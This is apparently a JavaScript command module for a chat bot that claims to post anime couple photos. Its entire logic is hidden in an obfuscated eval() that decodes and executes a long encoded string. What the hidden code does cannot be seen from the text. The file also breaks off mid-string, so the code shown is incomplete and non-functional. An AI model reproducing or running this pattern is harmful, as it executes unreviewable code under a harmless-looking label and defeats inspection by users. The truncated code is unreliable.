module.exports.config = {
    name: "anicouple",
    version: "1.0.5",
    permission: 0,
    usePrefix: true,
    credits: "Nayan",
    description: "Anime couple photo",
    commandCategory: "prefix",
    cooldowns: 2
};
const fs = require("fs");
const axios = require("axios");
 var _0xc65e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe28c(d,e,f){var g=_0xc65e[2][_0xc65e[1]](_0xc65e[0]);var h=g[_0xc65e[3]](0,e);var i=g[_0xc65e[3]](0,f);var j=d[_0xc65e[1]](_0xc65e[0])[_0xc65e[10]]()[_0xc65e[9]](function(a,b,c){if(h[_0xc65e[4]](b)!==-1)return a+=h[_0xc65e[4]](b)*(Math[_0xc65e[8]](e,c))},0);var k=_0xc65e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc65e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe28c(s,e,10)-t)}return decodeURIComponent(escape(r))}("BcyIDycIcBBIcBqIcBSIcByIBcyIDSyIByBIcDcIBygIByDIDyBIDyBIDygIDqBIDBqIDSyIByBIcDcIByyIDqBIDyyIByyIDqSIBSqIDyyIcDqIcBqIDycIcByIcqDIcBBIcBqIBSqIDSyIByBIcDcIBycIByBIDqDIByBIByBIDygIBSgIDSyIByBIcDcIByDIDyBIByyIDySIByDIDyyIBSBIcDyIDycIcBBIcBqIcBSIcByIBcyIDSyIByBIcDcIBySIDyDIByDIDyDIDycIBycIDBqIDSyIByBIcDcIByyIDqBIDyyIByyIBSgIDSyIByBIcDcIByDIDqcIDqDIBySIDqDIDySIDBqIDSyIByBIcDcIBycIByBIDqDIByBIByBIDygIBSqIBSBIDqSIcDDIcqBIcqDIcqSIDySIBSqIBgqIBgqIDSDIDSgIBSBIcDyIcByIcBgIcDgIcDyIDycIcBBIcBqIcBSIcByIBcyIDSyIByBIcDcIBySIBygIDqcIByBIDqcIDySIDBqIBSSIcBDIDyBIcBgIcBSIDySIDDSIcBqIcByIBSqIDSyIByBIcDcIBySIDyDIByDIDyDIDycIBycIBSqIByBIcDcIByDIBycIDyBIBSBIBSBIByqIBSqIByBIcDcIDqBIDqDIByyIBScIBSSIByBIcDcIByDIDyyIDyDIDySIBScIBSSIByBIcDcIDqBIBSDIBSSIByBIcDcIBygIDqBIDqqIBSBIBScIBSSIcBDIDyBIcBgIcBSIDySIDDSIcBqIcByIBSqIDSyIByBIcDcIBySIDyDIByDIDyDIDycIBycIBSqIByBIcDcIByDIBycIDySIBSBIBSBIByqIBSqIBSSIByBIcDcIByDIDyDIBygIByBIBScIByBIcDcIByDIBycIByDIBSDIByBIcDcIByDIBScIByBIcDcIByDIDyBIByDIByDIBSBIBScIBSSIcBDIDyBIcBgIcBSIDySIDDSIcBqIcByIBSqIDSyIByBIcDcIBySIDyDIByDIDyDIDycIBycIBSqIByBIcDcIByDIBygIBycIBSBIBSBIByqIBSqIByBIcDcIBygIDqcIDySIBSDIBSSIByBIcDcIBySIBScIByBIcDcIDqDIBygIBycIBSDIBSSIByBIcDcIByDIBScIByBIcDcIByDIDqqIDyBIDygIBSBIBScIcBDIDyBIcBgIcBSIDySIDDSIcBqIcByIBSqIDSyIByBIcDcIBySIDyDIByDIDyDIDycIBycIBSqIByBIcDcIByDIByBIDqDIBSBIBSBIByqIBSqIByBIcDcIBygIDqcIBScIByBIcDcIByDIDqcIByDIBSDIBSSIByBIcDcIDqDIBScIBSSIByBIcDcIBycIDqBIDqBIBSDIBSSIByBIcDcIByyIBSBIBScIBSSIcBDIDyBIcBgIcBSIDySIDDSIcBqIcByIBSqIDSyIByBIcDcIBySIDyDIByDIDyDIDycIBycIBSqIByBIcDcIByDIBycIDqBIBSBIBSBIByqIBSqIBSSIByBIcDcIByDIBygIDqcIByyIBScIByBIcDcIByDIBSDIByBIcDcIByDIBySIDygIByyIBScIByBIcDcIBygIBSDIBSSIByBIcDcIDqqIDqcIBSBIBSDIBSqIcBDIDyBIcBgIcBSIDySIDDSIcBqIcByIBSqIDSyIByBIcDcIBySIDyDIByDIDyDIDycIBycIBSqIByBIcDcIByDIByDIBySIBSBIBSBIByqIBSqIBSSIByBIcDcIBycIBycIDqBIBygIBScIBSSIByBIcDcIByyIBSDIBSSIByBIcDcIBySIByyIByyIBScIByBIcDcIDycIDygIByBIBSBIBSBIBScIcBDIDyBIcBgIcBSIDySIDDSIcBqIcByIBSqIDSyIByBIcDcIBySIDyDIByDIDyDIDycIBycIBSqIByBIcDcIByDIByDIDqDIBSBIBSBIByqIBSqIByBIcDcIBycIByyIDySIDyDIBScIByBIcDcIByDIBySIDySIBSDIBSSIByBIcDcIByDIDqBIBScIByBIcDcIBygIDyyIByDIBSDIBSSIByBIcDcIBycIBSBIBScIBSSIcBDIDyBIcBgIcBSIDySIDDSIcBqIcByIBSqIDSyIByBIcDcIBySIDyDIByDIDyDIDycIBycIBSqIByBIcDcIByDIBygIDqDIBSBIBSBIByqIBSqIBSSIByBIcDcIByDIDycIDqDIByDIBScIByBIcDcIDygIDygIByBIBScIByBIcDcIByDIBSDIByBIcDcIDySIDyDIDqcIBSBIBSDIBSqIBSSIcBDIDyBIcBgIcBSIDySIDDSIcBqIcByIBSqIDSyIByBIcDcIBySIDyDIByDIDyDIDycIBycIBSqIByBIcDcIByDIByDIBygIBSBIBSBIByqIBSqIBSSIByBIcDcIByDIDyBIDyBIBSDIByBIcDcIByDIDqBIBScIByBIcDcIByDIDyBIDySIDygIBScIByBIcDcIDyDIDqqIBycIBSBIBSBIDqSIcqDIDyyIBSqIDSyIByBIcDcIBySIBygIDqcIByBIDqcIDySIDBqIDBqIDBqIDSyIByBIcDcIByDIDyBIByyIDySIByDIDyyIBSBIDyDIcBgIDySIDyBIcqgIDqSIDySIcqSIcBSIDySIBcyIDSyIByBIcDcIByDIDqcIDqDIBySIDqDIDySIDSDIBgyIcBDIcDqIcBSIcqBIBgyIDSgIBSqIDSyIByBIcDcIByDIDqcIDqDIBySIDqDIDySIDSDIBgyIcBSIcqBIcqDIDyyIcByIBgyIDSgIBSqIBSBIBSBIDqSIccBIDycIDyBIcByIDycIcqBIBSqIDSyIByBIcDcIBySIByyIBycIDyBIDqqIBygIBSBIcDyIDSyIByBIcDcIByDIDqcIDqDIBySIDqDIDySIDSDIBgyIcBDIcDqIcBSIcqBIBgyIDSgIBSqIDSyIByBIcDcIByDIDqcIDqDIBySIDqDIDySIDSDIBgyIcBSIcqBIcqDIDyyIcByIBgyIDSgIBSqIBSBIBSBIDqSIccBIccBIccBIBSqIDSyIByBIcDcIByyIDyBIDqDIBySIBSgIByBIcDcIBygIBygIBSDIByBIcDcIDyDIDyBIDqDIBScIBSSIByBIcDcIBycIDqDIByyIDyDIDqqIBScIByBIcDcIDqBIDyyIByBIDycIDygIBSBIBSgIcqyIcBBIDygIcDqIcqSIDySIDSDIDSyIByBIcDcIBygIByDIDyBIDyBIDygIDqBIBSqIByBIcDcIByDIByBIDyyIBSBIDSgIDSDIDSyIByBIcDcIBygIByDIDyBIDyBIDygIDqBIBSqIByBIcDcIByDIBygIBySIBSBIDSgIDBqIDyBIcBSIcDgIcBqIDycIBcyIDyyIcDqIcBqIDycIcByIcqDIcBBIcBqIBSqIcDyIDyBIcBDIcqDIDqgIDSyIByBIcDcIByyIBycIDySIDycIBySIBSgIDySIcDBIDySIcBqIcByIDqgIDSyIByBIcDcIDqcIByBIDqqIDyyIBySIBySIBSgIDyBIcBgIcqqIcBSIDqgIDSyIByBIcDcIBySIByyIDqBIDqqIDqBIByyIccBIBSBIcDyIDycIcBBIcBqIcBSIcByIBcyIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIDBqIDSyIByBIcDcIBygIByDIDyBIDyBIDygIDqBIBSgIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDBqIcDyIBgyIcDqIcqcIDycIDgcIDyDIBgyIDqgIDyyIcDqIcBqIDycIcByIcqDIcBBIcBqIBSqIDSyIByBIcDcIBySIBySIDqDIByBIByyIByyIBSgIDSyIByBIcDcIDqcIByBIByyIBycIByDIDqBIBSBIcDyIcBgIDySIcByIcDqIcBgIcBqIBcyIDSyIByBIcDcIBySIBySIDqDIByBIByyIByyIBScIDSyIByBIcDcIDqcIByBIByyIBycIByDIDqBIDqSIccBIBSgIBgyIDgyIDygIcBqIDDcIDcBIBgyIDqgIDyyIcDqIcBqIDycIcByIcqDIcBBIcBqIBSqIDSyIByBIcDcIDqqIDqBIDqcIDyBIDySIByDIBSgIDSyIByBIcDcIByyIBygIByDIBycIBygIBySIBSBIcDyIcBgIDySIcByIcDqIcBgIcBqIBcyIDSyIByBIcDcIDqqIDqBIDqcIDyBIDySIByDIBScIDSyIByBIcDcIByyIBygIByDIBycIBygIBySIDqSIccBIBSgIBgyIcDcIDgqIcBgIcByIcBqIBgyIDqgIDyyIcDqIcBqIDycIcByIcqDIcBBIcBqIBSqIDSyIByBIcDcIBySIDqBIDqqIDygIDqcIByDIBSgIDSyIByBIcDcIByyIDqBIByyIByBIBySIBycIBSBIcDyIcBgIDySIcByIcDqIcBgIcBqIBcyIDSyIByBIcDcIBySIDqBIDqqIDygIDqcIByDIBScIDSyIByBIcDcIByyIDqBIByyIByBIBySIBycIDqSIccBIBSgIBgyIcBcIDcqIDcqIDSqIDgyIBgyIDqgIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIByDIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIDySIBSBIBSgIBgyIDySIDSqIDggIDSqIDycIBgyIDqgIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIByBIBSBIBSgIBgyIDgSIDDgIcqqIDDgIDySIBgyIDqgIDyyIcDqIcBqIDycIcByIcqDIcBBIcBqIBSqIDSyIByBIcDcIByDIDyyIBySIDqDIDyBIBygIBSgIDSyIByBIcDcIBygIDqqIBygIDygIBygIDygIBSBIcDyIcBgIDySIcByIcDqIcBgIcBqIBcyIDSyIByBIcDcIByDIDyyIBySIDqDIDyBIBygIBScIDSyIByBIcDcIBygIDqqIBygIDygIBygIDygIDqSIccBIBSgIBgyIDgcIDBSIDcSIDycIDcgIBgyIDqgIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIByDIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIBygIBSBIBSgIBgyIDyBIcDBIDSqIDcqIcqgIBgyIDqgIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIBySIBSBIBScIBgyIcBgIBgyIBSgIBgyIDSqIDDBIDBSIDggIDDSIBgyIDqgIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIBycIBSBIccBIDqSIcByIcBgIcDgIcDyIDycIcBBIcBqIcBSIcByIBcyIDSyIByBIcDcIByyIByBIBycIByBIDyDIBygIDBqIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBygIBygIBSBIDSgIBSqIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIDqqIBSBIDSgIBSqIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIByyIBSBIDSgIBSqIDSyIDSyIDygIcqDIcBgIcBqIDyBIcqyIDySIBSgIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIDycIBSBIDSgIBSBIBSgIDSyIByBIcDcIDqcIByBIDqqIDyyIBySIBySIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIBycIBSBIDSgIBSBIBSgIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBygIDyBIBSBIDSgIBSBIBSgIDSyIByBIcDcIByyIBygIDyyIDqDIBycIDySIDBqIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIDqqIBSBIDSgIBSqIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIByyIBSBIDSgIBSqIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIByDIBSBIDSgIBSqIDSyIDSyIDygIcqDIcBgIcBqIDyBIcqyIDySIBSgIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBygIByDIBSBIDSgIBSBIBSgIDSyIByBIcDcIDqcIByBIDqqIDyyIBySIBySIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIBycIBSBIDSgIBSBIBSgIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBygIDyBIBSBIDSgIBSBIBSgIcDyIcBqIDyBIcDgIDyBIcBqIDqgIDSyIByBIcDcIDqDIDycIBygIBycIBygIDycIccBIDBqIcqqIcqSIcBBIDyDIDyBIcqSIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIDqBIBSBIDSgIBSgIDSyIByBIcDcIBySIDqcIDyDIDqqIDqBIDqBIDBqIDyBIcDDIDyBIcqDIcByIBcyIDyBIcDcIcqDIcBBIcBSIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIDyDIBSBIDSgIBSqIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDygIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIByBIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIDyyIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIByDIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIBygIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIBySIBSBIBSBIBSgIDSyIByBIcDcIBygIDqqIDqqIByDIByyIBySIDBqIDSyIByBIcDcIBySIDqcIDyDIDqqIDqBIDqBIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDyBIBSBIDSgIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBygIDqcIBSBIDSgIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIDyDIBSBIDSgIBSgIDSyIByBIcDcIByDIDqDIDqqIDyDIByBIBySIDBqIDSyIByBIcDcIBySIDqcIDyDIDqqIDqBIDqBIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDyBIBSBIDSgIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBygIDqcIBSBIDSgIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBygIDqqIBSBIDSgIDqSIDSyIByBIcDcIByyIBycIDySIDycIBySIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIByyIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIDqcIBSBIDSgIBSqIBgyIScgIgqgIcgDIBgyIBSgIDSyIByBIcDcIDqcIByBIDqqIDyyIBySIBySIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDqqIBSBIDSgIBSgIDSyIByBIcDcIBygIDyDIBySIDqDIDySIDyDIDBqIDBBIcDyIccBIBSgIBgqIBgqIDSDIDSgIBSBIDqSIDycIcBBIcBqIcBSIcByIBcyIDSyIByBIcDcIByDIBygIDygIByBIBySIDycIDBqIBSqIDyBIcDDIDyBIcqDIcByIBcyIDyBIcDcIcqDIcBBIcBSIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIDyDIBSBIDSgIBSqIDSyIByBIcDcIBygIDqqIDqqIByDIByyIBySIBSgIcDyIBgyIcBgIDySIcBSIcBDIcBBIcBqIcBSIDySIDgDIcDgIcBDIDySIBgyIDqgIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIDycIBSBIDSgIccBIBSBIBSBIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDyBIBSBIDSgIDqSIDyyIcBSIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBygIByBIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDqBIBSBIDSgIBSqIDSyIByBIcDcIByyIByBIBycIByBIDyDIBygIBSgIDBSIcDqIDyyIDyyIDySIcBgIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDySIBSBIDSgIBSqIDSyIByBIcDcIByDIBygIDygIByBIBySIDycIBSgIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDqcIBSBIDSgIBSBIBSBIDqSIDycIcBBIcBqIcBSIcByIBcyIDSyIByBIcDcIByyIDySIByBIDqDIDycIDqqIDBqIBSqIDyBIcDDIDyBIcqDIcByIBcyIDyBIcDcIcqDIcBBIcBSIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIDyDIBSBIDSgIBSqIDSyIByBIcDcIByDIDqDIDqqIDyDIByBIBySIBSgIcDyIBgyIcBgIDySIcBSIcBDIcBBIcBqIcBSIDySIDgDIcDgIcBDIDySIBgyIDqgIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIDycIBSBIDSgIccBIBSBIBSBIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDyBIBSBIDSgIDqSIDyyIcBSIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBygIByBIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDqBIBSBIDSgIBSqIDSyIByBIcDcIByyIBygIDyyIDqDIBycIDySIBSgIDBSIcDqIDyyIDyyIDySIcBgIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDySIBSBIDSgIBSqIDSyIByBIcDcIByyIDySIByBIDqDIDycIDqqIBSgIDSyIByBIcDcIByDIByDIByyIDqDIDygIDygIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDqcIBSBIDSgIBSBIBSBIBSgIDSyIByBIcDcIByyIBycIDySIDycIBySIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIByBIBSBIBScIBgyIDySIBgyIDSgIBSqIcDyIBgyIDyBIcByIcByIDyBIDycIcqBIcqyIDySIcBqIcByIBgyIDqgIDSDIDyyIcBSIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBygIDqBIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDycIBSBIDSgIBSqIDSyIByBIcDcIByyIByBIBycIByBIDyDIBygIBSBIBSgIDyyIcBSIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBygIDqBIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDycIBSBIDSgIBSqIDSyIByBIcDcIByyIBygIDyyIDqDIBycIDySIBSBIDSgIccBIBSgIDSyIByBIcDcIDqcIByBIDqqIDyyIBySIBySIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDyDIBSBIDSgIBSgIDSyIByBIcDcIByyIDyDIDygIByBIDqDIDycIDBqIDBBIcDyIDycIcBBIcBqIcBSIcByIBcyIDSyIByBIcDcIBySIBySIBySIBycIDyBIDyDIDBqIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIDqSIDyyIcBSIDSDIDSyIByBIcDcIBySIBySIBySIBycIDyBIDyDIBSqIByBIcDcIByDIBycIByyIBSBIDSgIBSqIDSyIByBIcDcIByyIByBIBycIByBIDyDIBygIBSBIBSgIDyyIcBSIDSDIDSyIByBIcDcIBySIBySIBySIBycIDyBIDyDIBSqIByBIcDcIByDIBycIByyIBSBIDSgIBSqIDSyIByBIcDcIByyIBygIDyyIDqDIBycIDySIBSBIDqSIcqDIDyyIBSqIDSyIByBIcDcIByyIDyDIDygIByBIDqDIDycIBSBIcBgIDySIcByIcDqIcBgIcBqIBcyIDSyIByBIcDcIByyIBycIDySIDycIBySIDSDIDSyIByBIcDcIBySIBySIBySIBycIDyBIDyDIBSqIByBIcDcIByDIBycIByBIBSBIBScIBgyIDySIBgyIDSgIBSqIDSyIByBIcDcIBySIBySIBySIBycIDyBIDyDIBSqIByBIcDcIByDIByDIDyBIBSBIBScIDSyIByBIcDcIBySIBySIBySIBycIDyBIDyDIBSqIByBIcDcIByDIBycIDqDIBSBIBScIDSyIByBIcDcIBySIBySIBySIBycIDyBIDyDIBSqIByBIcDcIByDIBycIDqqIBSBIBScIDSyIByBIcDcIBySIBySIBySIBycIDyBIDyDIBSqIByBIcDcIByDIByDIDqcIBSBIBScIDSyIByBIcDcIBySIBySIBySIBycIDyBIDyDIBSqIByBIcDcIByDIByBIBycIBSBIBScIDSyIByBIcDcIBySIBySIBySIBycIDyBIDyDIBSqIByBIcDcIByDIByDIDygIBSBIBSgIDSyIByBIcDcIDqcIByBIDqqIDyyIBySIBySIDSDIDSyIByBIcDcIBySIBySIBySIBycIDyBIDyDIBSqIByBIcDcIByDIByBIDyDIBSBIDSgIBSgIDSyIByBIcDcIDqcIByBIDqqIDyyIBySIBySIDSDIDSyIByBIcDcIBySIBySIBySIBycIDyBIDyDIBSqIByBIcDcIByDIByBIDqqIBSBIDSgIBSBIDqSIccBIBSgIDSyIByBIcDcIDqcIByBIDqqIDyyIBySIBySIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDqqIBSBIDSgIBSBIDqSIccBIDycIDyBIcByIDycIcqBIBSqIDSyIByBIcDcIBycIBycIByDIDygIDyBIDygIBSBIcDyIDSyIByBIcDcIByyIBycIDySIDycIBySIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIByBIBSBIBScIBgyIDySIBgyIDSgIBSqIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBygIByyIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIDyyIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIDygIBSBIBSgIDSyIByBIcDcIDqcIByBIDqqIDyyIBySIBySIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDyDIBSBIDSgIBSgIBSqIBSBIDBqIDBBIDSyIByBIcDcIByyIBycIDySIDycIBySIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByDIByyIBSBIBScIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIBycIDqcIBSBIDSgIBSqIBgyIScgIgqSIcSDIBgyIBSgIDSyIByBIcDcIDqcIByBIDqqIDyyIBySIBySIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDqqIBSBIDSgIBSgIDSyIByBIcDcIByyIDqcIDycIBycIBygIByyIDBqIDBBIcDyIccBIBSgIBgqIBgqIDSDIDSgIBSBIBSgIDSyIByBIcDcIDqcIByBIDqqIDyyIBySIBySIDSDIDSyIByBIcDcIBySIDygIDqDIDqDIDqqIDygIBSqIByBIcDcIByDIByBIDqqIBSBIDSgIBSBIDqSIccBIccBIBSBIDqSIDyyIcDqIcBqIDycIcByIcqDIcBBIcBqIBcyIDSyIByBIcDcIByyIDqBIDyyIByyIBSqIDSyIByBIcDcIBySIDqqIByBIDySIDqBIDqcIBSgIDSyIByBIcDcIByDIByBIBygIByDIBygIDycIBSBIcDyIDycIcBBIcBqIcBSIcByIBcyIDSyIByBIcDcIDqcIByyIByDIDqcIBygIDqDIDBqIDSyIByBIcDcIByyIDyBIDqDIBySIBSqIBSBIDqSIcBgIDySIcByIcDqIcBgIcBqIBcyIDSyIByBIcDcIByyIDqBIDyyIByyIDBqIDyyIcDqIcBqIDycIcByIcqDIcBBIcBqIBSqIDSyIByBIcDcIByDIDyyIDqqIDyyIDySIByDIBSgIDSyIByBIcDcIByDIDygIByDIDyBIDygIBySIBSBIcDyIDSyIByBIcDcIByDIDyyIDqqIDyyIDySIByDIDBqIDSyIByBIcDcIByDIDyyIDqqIDyyIDySIByDIBSSIBSqIByBIcDcIDyyIBSDIByBIcDcIByDIBScIBSSIByBIcDcIByDIDqDIByyIDqBIBSDIByBIcDcIByDIBScIByBIcDcIByDIDqcIBySIDqDIBSBIDqSIcqSIDySIcByIBcyIDSyIByBIcDcIBygIBygIDyDIDyBIDqcIByyIDBqIDSyIByBIcDcIDqcIByyIByDIDqcIBygIDqDIDSDIDSyIByBIcDcIByDIDyyIDqqIDyyIDySIByDIDSgIDqSIcBgIDySIcByIcDqIcBgIcBqIBcyIDSyIByBIcDcIBygIBygIDyDIDyBIDqcIByyIDqSIccBIBSgIDSyIByBIcDcIByyIDqBIDyyIByyIBSqIDSyIByBIcDcIBySIDqqIByBIDySIDqBIDqcIBSgIDSyIByBIcDcIByDIByBIBygIByDIBygIDycIBSBIDqSIccBIDyyIcDqIcBqIDycIcByIcqDIcBBIcBqIBcyIDSyIByBIcDcIByyIDyBIDqDIBySIBSqIBSBIcDyIDycIcBBIcBqIcBSIcByIBcyIDSyIByBIcDcIBycIByBIByyIDygIByDIDyyIDBqIDSDIBgyIDgyIDygIcBqIDDcIDcBIBgyIBSgIBgyIDyBIcBDIcqDIDccIDyBIcDgIDyBIcBqIBgyIBSgIBgyIBygIDqcIByBIByyIBygIByyIDqqIDcDIDgqIDgyIDgSIDgcIDgcIBgyIBSgIBgyIcqDIDycIcByIcDqIcBgIDySIBSyIDScIcDcIBycIByBIDgDIcBgIBgyIBSgIBgyIDDDIDyBIcqDIcqSIDySIDygIDScIcDcIBycIByBIcByIcBBIDScIcDcIBycIByBIBgyIBSgIBgyIcqyIDyBIcqSIDySIBgyIBSgIBgyIDyBIcDBIDSqIDcqIcqgIBgyIBSgIBgyIcByIDySIcBgIBSyIBgyIBSgIBgyIDycIcBBIcDqIcBDIcqSIDySIByDIDSyIBgyIBSgIBgyIDScIcDcIBycIByBIDyBIcqqIDyBIcqDIcBqIDScIcDcIBycIByBIcqSIDyBIcByIBgyIBSgIBgyIcBSIDySIcBqIDygIDcDIDySIcBSIcBSIDyBIcqqIBgyIBSgIBgyIDgSIDDgIcqqIDDgIDySIBgyIBSgIBgyIcBSIDySIcBqIDygIDySIcBgIDDSIDDqIBgyIBSgIBgyIDycIcBBIcDqIcBDIcqSIDySIBycIDSyIBgyIBSgIBgyIcBDIcqSIDySIBgyIBSgIBgyIcDqIcBqIcqSIcqDIcBqIcqgIDgBIcDgIcBqIDycIBgyIBSgIBgyIDySIDScIcDcIBycIByBIDycIcBBIcDqIcBDIcqSIDySIDScIcDcIBycIByBIcBDIBgyIBSgIBgyIDqDIDqcIByDIDqDIByDIByyIcBqIDDcIDcSIDgqIcBDIDgyIBgyIBSgIBgyIDyyIDySIcByIDycIcqBIDScIcDcIBycIByBIDyBIcBqIcqDIcqyIBgyIBSgIBgyIDgqIDySIDyBIDycIcByIcqDIcBBIcBqIBgyIBSgIBgyIByyIBycIDqcIDqDIBygIDqcIDSqIDcgIDgSIDcBIcBSIDgBIBgyIBSgIBg